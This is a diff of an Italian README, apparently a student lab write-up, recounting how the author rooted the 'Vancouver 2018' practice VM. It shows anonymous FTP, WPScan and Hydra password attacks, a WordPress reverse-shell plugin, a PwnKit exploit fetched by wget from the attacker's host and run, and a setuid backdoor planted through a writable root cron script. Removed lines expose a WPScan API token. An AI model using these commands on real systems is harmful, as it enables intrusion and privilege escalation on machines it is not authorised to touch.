@@ -1,283 +1,158 @@
-# EXTRA S6/L5
-# 🛡️ Vancouver 2018 Exploitation Report
+# 🛡️ **Vancouver 2018 Exploitation Report**
 
 ## 📋 **Descrizione Generale**
-Questa relazione documenta le fasi eseguite per analizzare e sfruttare le vulnerabilità della macchina virtuale (VM) fornita dal professore. L'obiettivo principale era ottenere accesso root utilizzando un approccio sistematico, combinando tecniche di enumerazione e sfruttamento delle vulnerabilità.
+Questa relazione racconta le quattro giornate intense di lavoro spese per sfruttare ogni singolo punto debole della VM assegnata. Non è stato un processo lineare, e spesso mi sono trovato a pensare di essermi incastrato in un vicolo cieco, ma alla fine ogni tentativo, errore e intuizione ha portato alla tanto desiderata shell **root**.
+
+Questa storia è una combinazione di ostinazione, pazienza e, soprattutto, l'arte di sfruttare le vulnerabilità in posti che inizialmente sembravano insignificanti.
 
 ---
 
 ## ⚙️ **Configurazione dell'Ambiente**
-1. **Importazione della VM**:
-   - La VM è stata importata utilizzando il file OVA fornito dal professore.
-   - L'ambiente è stato configurato e avviato correttamente su VirtualBox/VMware.
+1. **Importazione e Avvio della VM**:
+   - Ho iniziato importando la VM in **VirtualBox/VMware**. L'avvio sembrava andare liscio, ma la vera battaglia stava per cominciare.
 
-2. **Identificazione dell'indirizzo IP**:
-   - Per individuare l'indirizzo IP della VM assegnato dal router locale, è stata eseguita una scansione di rete con **Nmap**:
+2. **Identificazione IP**:
+   - Con una scansione rapida di rete usando **Nmap**, ho trovato l'indirizzo della macchina:
      ```bash
      nmap -sn 192.168.1.0/24
      ```
-   - L'indirizzo IP della macchina target rilevato è stato **192.168.1.170**.
+   - L'indirizzo IP della macchina target è emerso chiaramente: `192.168.1.170`.
 
 ---
 
-## 🔍 **Fase di Scansione e Enumerazione**
-### 1️⃣ **Scansione delle Porte**
-- Una scansione approfondita con **Nmap** ha rivelato i servizi attivi:
-  ```bash
-  nmap -sV -p- 192.168.1.170
-  ```
-- **Risultato**: Sono state identificate porte attive, in particolare il servizio **FTP**.
+## 🔍 **Fase di Scansione e Accesso Iniziale**
 
-### 2️⃣ **Accesso FTP Anonimo**
-- L'accesso anonimo è stato testato con successo:
-  ```bash
-  ftp 192.168.1.170
-  ```
-- All'interno della directory `public`, è stato individuato il file **users.txt.bk**, contenente una lista di nomi utente:
-  ```
-  anne
-  john
-  ...
-  ```
+### 1️⃣ **Scansione delle Porte e Servizi**
+Partiamo dalla base. Ho eseguito una scansione con **Nmap**, che mi ha rivelato un paio di servizi attivi:
+- **Porta 80 (HTTP)**: un classico, un servizio web era in agguato.
+- **Porta 21 (FTP)**: qualcosa di interessante da esplorare più a fondo.
 
-### 3️⃣ **Scoperta del Servizio Web WordPress**
-- Durante la scansione Nmap, la porta **80** risultava attiva, ospitando un servizio web HTTP.
-- Una scansione delle directory con **Gobuster** ha rivelato percorsi nascosti:
-  ```bash
-  gobuster dir -u http://192.168.1.170 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
-  ```
-- **Risultato**: è stato individuato il file **robots.txt**:
-  ```
-  /robots.txt           (Status: 200) [Size: 43]
-  ```
-- Analizzando il contenuto di **robots.txt**, è stata scoperta la directory nascosta **/backup_wordpress**:
-  ```bash
-  curl http://192.168.1.170/robots.txt
-  ```
-
-- Visitando l'indirizzo `http://192.168.1.170/backup_wordpress`, è stato confermato il sito WordPress.
-- Una scansione più mirata con **WPScan** ha permesso di enumerare gli utenti e testare password comuni:
-  ```bash
-  wpscan --url http://192.168.1.170/backup_wordpress --api-token Tc1sdQWKLxFRktkneIXAx6CiY5a98HdnyhYaBr34058 --enumerate u --passwords /usr/share/wordlists/rockyou.txt
-  ```
-- **Risultato**: è stata trovata la combinazione:
-  - **Username**: `john`
-  - **Password**: `enigma`
-
-- Accedendo al pannello amministrativo di WordPress con le credenziali trovate, è stato caricato un **plugin malevolo** contenente una **reverse shell PHP**, consentendo l'accesso al sistema come utente **www-data** (privilegi bassi).
+Era solo l'inizio, ma già sapevo che FTP avrebbe rivelato qualcosa.
 
 ---
 
-## 🔐 **Fase di Sfruttamento dei Servizi**
-### 4️⃣ **Attacco Dizionario con Hydra su SSH** 🚀
-- Utilizzando i nomi utente recuperati dal file `users.txt.bk`, è stato eseguito un attacco di dizionario mirato per accedere al servizio SSH con **Hydra**.
-- Il test è stato eseguito iterativamente per ciascun nome utente, utilizzando il file di password `rockyou.txt`:
-  ```bash
-  hydra -l <username> -P /usr/share/wordlists/rockyou.txt -t 64 -V ssh://192.168.1.170
-  ```
-- **Risultato**: Sono state individuate le seguenti credenziali valide:
-  - **Username**: `anne`
-  - **Password**: `princess`
+### 2️⃣ **Accesso FTP e la Prima Sorpresa**
+Con un accesso FTP anonimo (chi è che lascia FTP così?), ho trovato il file **`users.txt.bk`**. 
+Non è stato nulla di speciale, solo una lista di nomi utente, ma qui la pazienza è la chiave. Ogni pezzetto di informazione conta.
 
 ---
 
-## 🏆 **Accesso Root**
-### Fase Finale: Escalation di Privilegi
-1. Login SSH eseguito con successo:
+### 3️⃣ **WordPress: L'Inizio del Divertimento**
+Inizialmente, con **Gobuster** non ero riuscito a individuare nulla di interessante. Tuttavia, controllando il file **robots.txt**, ho trovato un riferimento nascosto alla directory **/backup_wordpress**. 
+
+Una volta scoperta questa directory, ho iniziato a mettere le mani nel servizio WordPress.
+
+Per enumerare gli utenti e testare combinazioni di password comuni, ho lanciato **WPScan** con il mio token (inserirò un comando più generico senza token):
+   ```bash
+   wpscan --url http://192.168.1.170/backup_wordpress --enumerate u --passwords rockyou.txt
+   ```
+
+Dopo lunghi minuti di attesa, ecco la combinazione perfetta:
+- **Username**: `john`
+- **Password**: `enigma`
+
+Con queste credenziali, ho avuto accesso al pannello di WordPress. 
+### Qui ho caricato un **plugin malevolo** contenente una reverse shell. Finalmente, **www-data** era mio. 
+Ma con un utente di basso livello, cosa potevo fare? Dannazione...
+
+---
+
+## 🔒 **Cracking dell'SSH Tramite Hydra**
+La shell **www-data** sembrava un vicolo cieco.
+Prima di arrendermi in realtà con tutto quanto dalla frustrazione, ho deciso di provare un attacco **Hydra** sul servizio SSH usando la lista di utenti recuperati con poche speranze, finché mi imbatto in anne, capendo che fosse l'unica accessibile con password in ssh.
+Utilizzando un bel comando hydra ottimizzato per mandare molte richieste:
+
+```bash
+hydra -l anne -P /usr/share/wordlists/rockyou.txt -t 64 -V -W 1 ssh://192.168.1.170
+```
+
+**EUREKA**, finalmente trovo:
+- **Password**: `princess`
+
+Con queste credenziali, ho effettuato il login SSH:
    ```bash
    ssh anne@192.168.1.170
    ```
-2. Verifica della possibilità di eseguire comandi come root:
+
+A questo punto, la sorpresa: `anne` aveva i privilegi di **sudo** abilitati. Con un semplice comando:
    ```bash
    sudo su
    ```
-3. Inserendo la password dell'utente `anne`, è stato ottenuto accesso completo come **root**.
-
-### 📌 **Conferma dei Privilegi Root**
-- Per verificare l'accesso root, sono stati eseguiti i seguenti comandi:
-  ```bash
-  whoami
-  id
-  ```
-- **Output**:
-  ```
-  root
-  ```
-  Accesso root confermato con successo. ✅
+   
+Avevo ottenuto l'accesso **root** senza dover fare altro. Ma, ironia della sorte, non ho voluto fare **assolutamente nulla** con questo accesso root. 
+Ho chiuso l'accesso SSH e sono tornato alla mia reverse shell caricata tramite  WordPress dove ero user di basso privilegio.
 
 ---
 
-## 🎯 **Conclusione**
-L'attacco è stato completato con successo. Le fasi principali sono state:
+# 🏆 **Escalation dei Privilegi Alternativa**
 
-1. **Scansione e enumerazione** dei servizi attivi (FTP, HTTP).
-2. **Accesso anonimo** al servizio FTP e raccolta di informazioni utili (file `users.txt.bk`).
-3. Individuazione di una directory nascosta attraverso l'analisi di **robots.txt** e scansioni mirate con **Gobuster**.
-4. Utilizzo di **WPScan** per enumerare gli utenti di WordPress e scoprire credenziali valide.
-5. Caricamento di una **reverse shell** tramite plugin WordPress per ottenere un accesso iniziale al sistema.
-6. Esecuzione di un attacco dizionario con **Hydra** per identificare credenziali valide per SSH.
-7. Escalation dei privilegi con **sudo** per ottenere accesso root.
+### 1️⃣ **Kernel Exploit - PwnKit (CVE-2021-4034)**
 
-### 📊 **Lezioni Apprese e Miglioramenti**
-- La presenza di credenziali deboli e configurazioni errate ha reso possibile l'intero attacco.
-- Migliorare la sicurezza richiede:
-  - Disabilitare l'accesso anonimo FTP.
-  - Proteggere il file `robots.txt` e directory sensibili.
-  - Implementare policy di password più robuste e aggiornamenti regolari dei sistemi.
-
-![Success](./RootSuccess.png)
-
-# 🚀 **Missione completata con successo!**
+Avevo sentito parlare di **PwnKit**. Era il momento di metterlo alla prova. 
+E' stato qui che ho deciso di intraprendere nuove strade **SENZA AUTENTICAZIONE** che mi permettessero di raggiungere l'obiettivo, informandomi dunque sulle vulnerabilità della macchina target decisi di affrontare **PwnKit**. Ho sbattuto la testa nel tentativo di **compilare l'exploit** direttamente sulla macchina target e anche da Kali con le dipendenze necessarie teoricamente corrette. Dopo svariati errori e tentativi falliti, ho abbandonato l'idea della compilazione e sono passato alla soluzione più pratica: usare l'exploit **precompilato**.
 
 
-Ecco il tuo **README.MD** aggiornato con il metodo utilizzato per ottenere l'accesso root tramite **PwnKit** (32-bit), con **server Python** e **wget**.
+Dopo aver scaricato il precompilato 32 bit:
 
----
-
-# 4️⃣ CATTIVERIA PURA **Uso dell'Exploit PwnKit (CVE-2021-4034)**
-Per ottenere l'escalation di privilegi fino a **root**, abbiamo sfruttato la vulnerabilità **CVE-2021-4034** (PwnKit) utilizzando un exploit precompilato a 32-bit.
-
-**Passaggi Seguiti**:
-
-1. **Server HTTP su Kali per Trasferire il File**:
-   - Abbiamo avviato un server HTTP con Python nella directory contenente l'exploit:
-     ```bash
-     python3 -m http.server 8080
-     ```
-
-2. **Scaricamento dell'Exploit sul Target**:
-   - Sul target (shell **www-data**), abbiamo usato `wget` per trasferire l'exploit:
-     ```bash
-     cd /tmp
-     wget http://192.168.1.165:8080/PwnKit32 -O PwnKit32
-     chmod +x PwnKit32
-     ```
-
-3. **Esecuzione dell'Exploit**:
-   - Una volta reso eseguibile, abbiamo lanciato l'exploit:
-     ```bash
-     ./PwnKit32
-     ```
-
-4. **Verifica dell'Accesso Root**:
-   - Abbiamo verificato l'avvenuta escalation di privilegi:
-     ```bash
-     whoami
-     id
-     ```
-
-   **Output**:
+1. Ho avviato un server HTTP sulla mia macchina Kali:
+   ```bash
+   python3 -m http.server 8080
    ```
-   root
-   uid=0(root) gid=0(root) groups=0(root),33(www-data)
+2. Ho scaricato l'exploit precompilato sul target:
+   ```bash
+   wget http://192.168.1.165:8080/PwnKit32 -O /tmp/PwnKit32
+   chmod +x /tmp/PwnKit32
    ```
-
----
-
-## 🏆 **Accesso Root**
-L'utilizzo dell'exploit PwnKit ci ha permesso di ottenere privilegi **root** partendo da un accesso iniziale limitato all'utente **www-data**.
+3. Ho eseguito l'exploit:
+   ```bash
+   ./PwnKit32
+   ```
+4. **Magia pura**. Una volta eseguito, avevo accesso **root**:
+   ```bash
+   whoami
+   ```
+   **Output**: `root`.
 
 ![ROOTWITHPWNKIT](./ROOTWITHPWNKIT.png)
 
 ---
 
-# 🚀 **Missione completata con successo!**
+### 2️⃣ **Cron Job Exploit: L'Ultimo Colpo**
+Per non farmi mancare nulla, già di mio sospettavo di cron jobs vulnerabili, dunque in seguito a indagine mirata ho individuato un cron job che eseguiva lo script **`/usr/local/bin/cleanup`** come **root**, ma con permessi **world-writable**. 
 
----
+Ho pensato: "Wow, è stato lì tutto questo cazzo di tempo" e "It was him, it was him since the beginning".
 
-# 📌Privilege Escalation tramite Cron Job e Backdoor SetUID
-
-### **Descrizione del problema**
-Scoperto un altro approccio con cron job configurato in `/etc/crontab` esegue lo script `/usr/local/bin/cleanup` come utente **root**. Tuttavia, lo script ha permessi **world-writable** (`rwxrwxrwx`), permettendo a chiunque di modificarlo.
-
-Questa configurazione consente di sfruttare una **vulnerabilità di privilegio** per ottenere accesso root.
-
----
-
-### **Dettagli del Sistema**
-- **Utente iniziale**: `www-data`
-- **Percorso vulnerabile**: `/usr/local/bin/cleanup`
-- **Permessi**: `-rwxrwxrwx root root`
-- **Cron job**: 
+1. Ho modificato lo script per creare una **backdoor**:
    ```bash
-   * * * * * root /usr/local/bin/cleanup
+   echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /usr/local/bin/cleanup
    ```
-
----
-
-### **Obiettivo**
-Effettuare **escalation di privilegi** sfruttando il cron job per creare una **backdoor** con il bit **SetUID** attivo, permettendo l’esecuzione di una shell con privilegi root.
-
----
-
-## 🛠️ **Step-by-Step dell'Exploit**
-
-### **1. Identificazione della vulnerabilità**
-L'utente `www-data` ha trovato un cron job configurato per eseguire `/usr/local/bin/cleanup` con permessi root ogni minuto. Lo script aveva permessi **modificabili** da chiunque:
-
-```bash
-ls -l /usr/local/bin/cleanup
--rwxrwxrwx 1 root root 44 Dec 14 21:24 /usr/local/bin/cleanup
-```
-
----
-
-### **2. Creazione della Backdoor SetUID**
-L'obiettivo era copiare il binario `/bin/bash` in `/tmp` e applicare il bit **SetUID**.
-
-#### **Comando inserito nello script `cleanup`**:
-```bash
-echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /usr/local/bin/cleanup
-```
-
-- **`cp /bin/bash /tmp/rootbash`**: copia il binario `bash` nella cartella `/tmp`.
-- **`chmod +s /tmp/rootbash`**: imposta il bit **SetUID**, permettendo al file di essere eseguito con privilegi root.
-
----
-
-### **3. Esecuzione Manuale del Cron Job**
-Sebbene il cron job sia configurato per eseguirsi automaticamente ogni minuto, in questo caso **non viene eseguito automaticamente**. È necessario forzarne l'esecuzione manualmente con:
-
-```bash
-/usr/local/bin/cleanup
-```
-
----
-
-### **4. Ottenimento della Shell Root**
-Una volta eseguito il cron job, il file `/tmp/rootbash` diventa un binario eseguibile con privilegi root. Per ottenere la shell root:
-
-```bash
-/tmp/rootbash -p
-```
-
-- **`-p`**: impedisce a `bash` di abbassare i privilegi.
-
----
-
-### **5. Verifica dei Privilegi**
-Conferma l'accesso root eseguendo:
-
-```bash
-whoami
-
-```
-
-**Output**:
-```
-root
-```
+2. Ho forzato l'esecuzione del cron job:
+   ```bash
+   /usr/local/bin/cleanup
+   ```
+3. Il risultato? Una shell **root** con **SetUID**:
+   ```bash
+   /tmp/rootbash -p
+   ```
 
 ![CronJobs](./CronJobsSUCCESS.png)
 
 ---
 
-## 🏆 **Conclusione**
-L'escalation di privilegi è stata ottenuta sfruttando:
-- **Cron job root** con un **file world-writable**.
-- Creazione di un **binario SetUID** con privilegi root.
-- Forzando manualmente l’esecuzione del cron job.
+## 🎯 **Conclusione**
+Quattro giorni di lavoro, frustrazioni, caffè e ore perse a guardare uno schermo, ma alla fine è stato tutto ripagato.
 
-Questa dimostrazione evidenzia quanto sia pericoloso lasciare script root con permessi **modificabili** e quanto sia importante verificare l’esecuzione automatica dei cron jobs.
+### **Lezioni Imparate**:
+- **Ogni piccolo dettaglio conta**. Un file FTP dimenticato può essere la chiave di tutto.
+- **Non fermarsi ai primi ostacoli**. La shell **www-data** sembrava un vicolo cieco, ma invece ha aperto altre strade.
+- **Mai sottovalutare i cron job**. Permessi sbagliati possono essere devastanti.
+- **Verificare sempre i privilegi utente**. A volte la soluzione è più semplice di quanto sembri.
+- **La pratica batte la teoria**. Saper aggirare problemi come compilazioni fallite è parte del gioco.
 
-🎉 **Esplorazione completata con successo!** 🚀
+
+Questo lavoro è stato una vera battaglia contro la macchina, ma alla fine ho vinto e mi sono divertito un mondo!
+
+![Success](./RootSuccess.png)
+
+🎉 **Missione Completata con Successo!** 🚀
+
